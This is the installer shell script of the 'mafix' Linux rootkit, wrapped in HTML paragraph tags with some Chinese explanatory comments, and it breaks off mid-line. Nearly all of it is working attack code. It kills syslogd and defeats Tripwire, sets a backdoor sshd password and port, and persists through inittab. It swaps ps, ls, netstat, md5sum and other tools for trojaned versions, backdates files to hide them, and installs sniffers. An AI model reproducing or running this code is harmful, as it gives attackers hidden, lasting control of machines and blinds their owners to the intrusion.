PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</p><p>BLK=' [1;30m'</p><p>MAG=' [1;35m'</p><p>CYN=' [1;30m'</p><p>RED='^[[1;32m'</p><p>DMAG=' [1;37m'</p><p>RES=' [0m'</p><p>&nbsp;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; /__/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; ${DMAG} &nbsp; ___ &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; /__/| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:: &nbsp; &nbsp; &nbsp; / &nbsp;/:: &nbsp; &nbsp; &nbsp; / &nbsp;/:/_ &nbsp;${DMAG} &nbsp;/ &nbsp;/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:|: &nbsp; &nbsp; / &nbsp;/:/: &nbsp; &nbsp; / &nbsp;/:/ / ${DMAG} / &nbsp;/:/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;__|__|:|: &nbsp; / &nbsp;/:/~/:: &nbsp; / &nbsp;/:/ /:/ ${DMAG}/__/:: &nbsp; &nbsp;${CYN} &nbsp;__|__|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} /__/::::| : /__/:/ /:/: /__/:/ /:/ &nbsp;${DMAG}__/:__ ${CYN} /__/::::____${RES}&quot;</p><p>echo &quot;${CYN}  &nbsp;:~~__/  &nbsp;:/:/__/  &nbsp;:/:/ &nbsp; ${DMAG} &nbsp;  &nbsp;:/ ${CYN} &nbsp; ~~~::::/${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;::/ &nbsp; &nbsp; &nbsp;  &nbsp;::/ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;__::/${CYN} &nbsp; &nbsp; |~~|:|~~ ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;  &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;/__/:/ ${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; ${DMAG} &nbsp; &nbsp;__/ &nbsp;${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; ${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; |__|/ &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG}${RES}&quot;</p><p>echo &quot;${DMAG}- the ferrari of rootkits - ${RES}&quot;</p><p>sleep 5</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} extracting libs...${RES}&quot;</p><p>tar zxf mafixlibs</p><p>if [ &quot;$(whoami)&quot; != &quot;root&quot; ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} you need to be root to backdoor the box...${RES}&quot;</p><p>&nbsp; &nbsp;exit</p><p>fi</p><p>cd $BASEDIR</p><p>sleep 1</p><p>killall -9 syslogd &gt;/dev/null 2&gt;&amp;1</p><p>startime=`date +%S`</p><p>&nbsp;</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} backdooring box...${RES}&quot;</p><p>SYSLOGCONF=&quot;/etc/syslog.conf&quot;</p><p>REMOTE=`grep -v &quot;^#&quot; &quot;$SYSLOGCONF&quot; | grep -v &quot;^$&quot; | grep &quot;@&quot; | cut -d '@' -f 2`</p><p>if [ ! -z &quot;$REMOTE&quot; ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Remote logging found! I hope you got access to these box:${RES}&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for host in $REMOTE; do</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo -n &quot; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo $host</p><p>&nbsp; &nbsp; &nbsp; &nbsp; done</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo ' ${CYN}coz this box is logging to it${RES}'</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no remote logging found...${RES}&quot;</p><p>fi</p><p>uname=`uname -n`</p><p>twd=/var/lib/tripwire/$uname.twd</p><p>if [ -d /etc/tripwire ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} WARNING: TRIPWIRE FOUND!${RES}&quot;</p><p>if [ -f /var/lib/tripwire/$uname.twd ]; then</p><p>&nbsp; &nbsp; &nbsp; chattr -isa $twd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#去保护，如果有的话，覆盖，chattr +isa 写保护</p><p>&nbsp; &nbsp;else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no tripwire db found...${RES}&quot;</p><p>&nbsp; &nbsp;fi</p><p>else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no tripwire was detected..${RES}&quot;</p><p>fi</p><p># restoring login</p><p>if [ -f /sbin/xlogin ]; then</p><p>&nbsp; &nbsp;chattr -isa /sbin/xlogin</p><p>&nbsp; &nbsp;chattr -isa /bin/login</p><p>&nbsp; &nbsp;mv -f /sbin/xlogin /bin/login</p><p>&nbsp; &nbsp;chmod 7455 /bin/login</p><p>&nbsp; &nbsp;chattr +isa /bin/login</p><p>fi</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} installing trojans...${RES}&quot;</p><p>if [ -f /etc/sh.conf ]; then</p><p>&nbsp; chattr -isa /etc/sh.conf</p><p>&nbsp; rm -rf /etc/sh.conf</p><p>fi</p><p># checking if we got needed libs and filez</p><p>if [ ! -f /lib/libproc.a ]; then</p><p>&nbsp; &nbsp;mv bin/lib/libproc.a /lib/ 2&gt;/dev/null</p><p>fi</p><p>&nbsp;</p><p>if [ ! -f /lib/libproc.so.2.0.6 ]; then</p><p>&nbsp; &nbsp;mv bin/lib/libproc.so.2.0.6 /lib/ 2&gt;/dev/null</p><p>fi</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} hold on...${RES}&quot;</p><p>/sbin/ldconfig &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>if [ ! -f /usr/bin/md5sum ]; then</p><p>&nbsp; &nbsp;touch -acmr /bin/ls bin/md5sum</p><p>&nbsp; &nbsp;cp bin/md5sum /usr/bin/md5sum</p><p>fi</p><p>DEFPASS=race</p><p>DEFPORT=11111</p><p>if test -n &quot;$1&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $1${RES}&quot;</p><p>&nbsp; &nbsp;cd $BASEDIR/bin</p><p>&nbsp; &nbsp;echo -n $1|md5sum &gt; /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#生成密码文件</p><p>else</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $DEFPASS${RES}&quot;</p><p>&nbsp; &nbsp;echo -n $DEFPASS|md5sum &gt; /etc/sh.conf</p><p>fi</p><p>&nbsp;</p><p>touch -acmr /bin/ls /etc/sh.conf</p><p>chown -f root:root /etc/sh.conf</p><p>chattr +isa /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#写保护</p><p>&nbsp;</p><p>if test -n &quot;$2&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Port:${DMAG} $2${RES}&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $2&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;echo &quot;3 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;echo &quot;4 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf 2&gt;/dev/null</p><p>else</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $DEFPORT${RES}&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $DEFPORT&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp;&nbsp;</p><p>&nbsp; &nbsp;echo &quot;3 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;echo &quot;4 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $B\nASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf 2&gt;/dev/null</p><p>fi</p><p>&nbsp;</p><p>if [ -f /lib/lidps1.so ]; then</p><p>&nbsp; chattr -isa /lib/lidps1.so</p><p>&nbsp; rm -rf /lib/lidps1.so</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/hosts.h ]; then</p><p>&nbsp; chattr -isa /usr/include/hosts.h</p><p>&nbsp; rm -rf /usr/include/hosts.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/file.h ]; then</p><p>&nbsp; chattr -isa /usr/include/file.h</p><p>&nbsp; rm -rf /usr/include/file.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/log.h ]; then</p><p>&nbsp; chattr -isa /usr/include/log.h</p><p>&nbsp; rm -rf /usr/include/log.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/proc.h ]; then</p><p>&nbsp; chattr -isa /usr/include/proc.h</p><p>&nbsp; rm -rf /usr/include/proc.h</p><p>fi</p><p>&nbsp;</p><p>cd $BASEDIR</p><p>mv $BASEDIR/bin/headers/lidps1.so /lib/lidps1.so 2&gt;/dev/null</p><p>touch -acmr /bin/ls /lib/lidps1.so &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #修改文件时间与/bin/ls 时间相同</p><p>touch -acmr /bin/ls $BASEDIR/bin/headers/* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#修改时间</p><p>mv $BASEDIR/bin/headers/* &nbsp;/usr/include/ 2&gt;/dev/null</p><p>&nbsp;</p><p># Ok lets start creating dirs</p><p>&nbsp;</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>if [ -d /lib/libsh.so ]; then</p><p>&nbsp; &nbsp;chattr -isa /lib/libsh.so</p><p>&nbsp; &nbsp;chattr -isa /lib/libsh.so/*</p><p>&nbsp; &nbsp;rm -rf /lib/libsh.so</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/lib/libsh ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/lib/libsh</p><p>&nbsp; &nbsp;chattr -isa /usr/lib/libsh/*</p><p>&nbsp; &nbsp;rm -rf /usr/lib/libsh/*</p><p>fi</p><p>&nbsp;</p><p>mkdir $SSHDIR 2&gt;/dev/null</p><p>touch -acmr /bin/ls $SSHDIR</p><p>mkdir $HOMEDIR 2&gt;/dev/null</p><p>touch -acmr /bin/ls $HOMEDIR</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>mv .sh/* $SSHDIR/ 2&gt;/dev/null</p><p>mv .sh/.bashrc $HOMEDIR 2&gt;/dev/null</p><p>&nbsp;</p><p>if [ -f /sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /sbin/ttymon ]; then</p><p>&nbsp; &nbsp;chattr -isa /sbin/ttymon</p><p>&nbsp; &nbsp;rm -rf /sbin/ttymon</p><p>fi</p><p>&nbsp;</p><p>mv $SSHDIR/sshd /sbin/ttyload 2&gt;/dev/null</p><p>chmod a+xr /sbin/ttyload 2&gt;/dev/null</p><p>chmod o-w /sbin/ttyload 2&gt;/dev/null</p><p>touch -acmr /bin/ls /sbin/ttyload</p><p>chattr +isa /sbin/ttyload</p><p>kill -9 `pidof ttyload` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>mv $BASEDIR/bin/ttymon /sbin/ttymon 2&gt;/dev/null</p><p>chmod a+xr /sbin/ttymon 2&gt;/dev/null</p><p>touch -acmr /bin/ls /sbin/ttymon</p><p>chattr +isa /sbin/ttymon</p><p>kill -9 `pidof ttymon` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>cp /bin/bash $SSHDIR</p><p>&nbsp;</p><p># INITTAB SHUFFLING</p><p>&nbsp;</p><p>chattr -isa /etc/inittab</p><p>cat /etc/inittab |grep -v ttyload|grep -v getty &gt; /tmp/.init1</p><p>cat /etc/inittab |grep getty &gt; /tmp/.init2</p><p>echo &quot;# Loading standard ttys&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;0:2345:once:/usr/sbin/ttyload&quot; &gt;&gt; /tmp/.init1</p><p>cat /tmp/.init2 &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# modem getty.&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# mo:235:respawn:/usr/sbin/mgetty -s 38400 modem&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# fax getty (hylafax)&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# mo:35:respawn:/usr/lib/fax/faxgetty /dev/modem&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# vbox (voice box) getty&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# I6:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI6&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# I7:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI7&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# end of /etc/inittab&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;/sbin/ttyload -q &gt;/dev/null 2&gt;&amp;1&quot; &gt; /usr/sbin/ttyload</p><p>echo &quot;/sbin/ttymon &gt;/dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>touch -acmr /bin/ls /usr/sbin/ttyload</p><p>chmod +x /usr/sbin/ttyload 2&gt;/dev/null</p><p>chattr +isa /usr/sbin/ttyload</p><p>/usr/sbin/ttyload &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>touch -amcr /etc/inittab /tmp/.init1</p><p>mv -f /tmp/.init1 /etc/inittab 2&gt;/dev/null</p><p>rm -rf /tmp/.init2</p><p>&nbsp;</p><p># MAKING SURE WE GOT IT BACKDORED RIGHT !</p><p>&nbsp;</p><p>if [ ! &quot;`grep ttyload /etc/inittab`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} inittab broken, sshd wont be loaded upon reboot :(${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p># Say hello to md5sum fixer boys n gurls !</p><p>&nbsp;</p><p>if [ -f /sbin/ifconfig ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /sbin/ifconfig &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/ps ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/ps &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/ls ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/ls &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/netstat ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/netstat &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/find ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/find &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/top ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/top &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/sbin/lsof ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/sbin/lsof &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/slocate ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/slocate &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/dir ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/dir &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/md5sum ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/md5sum &gt;&gt; .shmd5</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>if [ ! -f /dev/srd0 ]; then</p><p>&nbsp; ./encrypt -e .shmd5 /dev/srd0</p><p>&nbsp; touch -acmr /bin/ls /dev/srd0</p><p>&nbsp; chattr a+r /dev/srd0</p><p>&nbsp; chown -f root:root /dev/srd0</p><p>fi</p><p>&nbsp;</p><p>rm -rf .shmd5</p><p>&nbsp;</p><p>&nbsp;</p><p># time change bitch</p><p>&nbsp;</p><p>touch -acmr /sbin/ifconfig ifconfig &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/ps ps &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/ls ls &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/netstat netstat &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/find find &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/top top &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/sbin/lsof lsof &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /sbin/syslogd syslogd &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/slocate slocate &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/dir dir &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/md5sum md5sum &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/pstree pstree &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>&nbsp;</p><p># Backdoor ps/top/du/ls/netstat/etc..</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>&nbsp;</p><p>BACKUP=/usr/lib/libsh/.backup</p><p>mkdir $BACKUP 2&gt;/dev/null</p><p>&nbsp;</p><p># ps ...</p><p>if [ -f /usr/bin/ps ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/ps</p><p>&nbsp; &nbsp;cp /usr/bin/ps $BACKUP</p><p>&nbsp; &nbsp;mv -f ps /usr/bin/ps 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/ps</p><p>fi</p><p>&nbsp;</p><p>if [ -f /bin/ps ]; then</p><p>&nbsp; &nbsp;chattr -isa /bin/ps</p><p>&nbsp; &nbsp;cp /bin/ps $BACKUP</p><p>&nbsp; &nbsp;mv -f ps /bin/ps 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /bin/ps</p><p>fi</p><p>&nbsp;</p><p># ifconfig ...</p><p>chattr -isa /sbin/ifconfig</p><p>cp /sbin/ifconfig $BACKUP</p><p>mv -f ifconfig /sbin/ifconfig 2&gt;/dev/null</p><p>chattr +isa\n/sbin/ifconfig</p><p>&nbsp;</p><p># netstat ...</p><p>if [ -f /usr/sbin/netstat ]; then</p><p>&nbsp; chattr -isa /usr/sbin/netstat</p><p>&nbsp; mv -f netstat /usr/sbin/netstat 2&gt;/dev/null</p><p>&nbsp; chattr +isa /usr/sbin/netstat</p><p>fi</p><p>&nbsp;</p><p>chattr -isa /bin/netstat</p><p>cp /bin/netstat $BACKUP</p><p>mv -f netstat /bin/netstat 2&gt;/dev/null</p><p>chattr +isa /bin/netstat</p><p>&nbsp;</p><p># top ...</p><p>if [ -f /usr/bin/top ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/top</p><p>&nbsp; &nbsp;cp /usr/bin/top $BACKUP</p><p>&nbsp; &nbsp;mv -f top /usr/bin/top 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/top</p><p>&nbsp; &nbsp;if [ -f /lib/libncurses.so.5 ]; then</p><p>&nbsp; &nbsp; &nbsp; ln -s /lib/libncurses.so.5 /lib/libncurses.so.4 2&gt;/dev/null</p><p>&nbsp; &nbsp;fi</p><p>&nbsp; &nbsp;if [ -f /usr/lib/libncurses.so.5 ]; then</p><p>&nbsp; &nbsp; &nbsp; ln -s /usr/lib/libncurses.so.5 /lib/libncurses.so.4 2&gt;/dev/null</p><p>&nbsp; &nbsp;fi</p><p>fi</p><p>&nbsp;</p><p># slocate ...</p><p>if [ -f /usr/bin/slocate ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/slocate</p><p>&nbsp; &nbsp;cp /usr/bin/slocate $BACKUP</p><p>&nbsp; &nbsp;mv -f slocate /usr/bin/slocate 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/slocate</p><p>fi</p><p>&nbsp;</p><p># ls ...</p><p>chattr -isa /bin/ls</p><p>cp /bin/ls $BACKUP</p><p>mv -f ls /bin/ls 2&gt;/dev/null</p><p>chattr +isa /bin/ls</p><p>&nbsp;</p><p># find ...</p><p>if [ -f /usr/bin/find ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/find</p><p>&nbsp; &nbsp;cp /usr/bin/find $BACKUP</p><p>&nbsp; &nbsp;mv -f find /usr/bin/find 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/find</p><p>fi</p><p>&nbsp;</p><p># dir ...</p><p>if [ -f /usr/bin/dir ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/dir</p><p>&nbsp; &nbsp;cp /usr/bin/dir $BACKUP</p><p>&nbsp; &nbsp;mv -f dir /usr/bin/dir 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/dir</p><p>fi</p><p>&nbsp;</p><p># lsof ...</p><p>if [ -f /usr/sbin/lsof ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/lsof</p><p>&nbsp; &nbsp;cp /usr/sbin/lsof $BACKUP</p><p>&nbsp; &nbsp;mv -f lsof /usr/sbin/lsof 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/sbin/lsof</p><p>fi</p><p>&nbsp;</p><p># pstree ...</p><p>if [ -f /usr/bin/pstree ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/pstree</p><p>&nbsp; &nbsp;cp /usr/bin/pstree $BACKUP</p><p>&nbsp; &nbsp;mv -f pstree /usr/bin/pstree 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/pstree</p><p>fi</p><p>&nbsp;</p><p># md5sum ...</p><p>chattr -isa /usr/bin/md5sum</p><p>cp /usr/bin/md5sum $BACKUP</p><p>mv -f md5sum /usr/bin/md5sum 2&gt;/dev/null</p><p>chattr +isa /usr/bin/md5sum</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} backdoored some daemons (netstat, ps)${RES}&quot;</p><p>&nbsp;</p><p>cd $BASEDIR</p><p>&nbsp;</p><p>mkdir $HOMEDIR/.sniff 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shsniff $HOMEDIR/.sniff/shsniff 2&gt;/dev/null</p><p>chmod +x $BASEDIR/bin/sshd 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shp $HOMEDIR/.sniff/shp 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shsb $HOMEDIR/shsb 2&gt;/dev/null</p><p>mv $BASEDIR/bin/hide $HOMEDIR/hide 2&gt;/dev/null</p><p>touch -acmr /bin/ls $HOMEDIR/.sniff/shsniff</p><p>touch -acmr /bin/ls $HOMEDIR/.sniff/shp</p><p>touch -acmr /bin/ls $HOMEDIR/shsb</p><p>touch -acmr /bin/ls $HOMEDIR/hide</p><p>chmod +x $HOMEDIR/.sniff/* 2&gt;/dev/null</p><p>chmod +x $HOMEDIR/shsb 2&gt;/dev/null</p><p>chmod +x $HOMEDIR/hide 2&gt;/dev/null</p><p>./bin/sshd $1 $2 &gt;&gt; /dev/null</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} checking for some vuln daemons....${RES}&quot;</p><p>ps aux &gt; /tmp/.procs</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep named`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} NAMED FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/wu.ftpd ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} WU-FTPD FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep smbd`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} SAMBA FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep rpc.statd`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} RPC.STATD FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>rm -rf /tmp/.procs</p><p>&nbsp;</p><p>netstat -natp &gt; /tmp/.stats</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.stats | grep 443 | grep http`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} MOD_SSL FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>rm -rf /tmp/.stats</p><p>&nbsp;</p><p>&nbsp;</p><p># CHECKING FOR HOSTILE ROOTKITS/BACKDORS</p><p>&nbsp;</p><p>&nbsp;</p><p>mkdir $HOMEDIR/.owned 2&gt;/dev/null</p><p>&nbsp;</p><p>if [ -f /etc/ttyhash ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /etc/ttyhash</p><p>&nbsp; &nbsp;rm -rf /etc/ttyhash</p><p>fi</p><p>&nbsp;</p><p>if [ -d /lib/ldd.so ]; then</p><p>&nbsp; &nbsp;chattr -isa /lib/ldd.so</p><p>&nbsp; &nbsp;chattr -isa /lib/ldd.so/*</p><p>&nbsp; &nbsp;mv /lib/ldd.so $HOMEDIR/.owned/tk8</p><p>&nbsp; &nbsp;echo 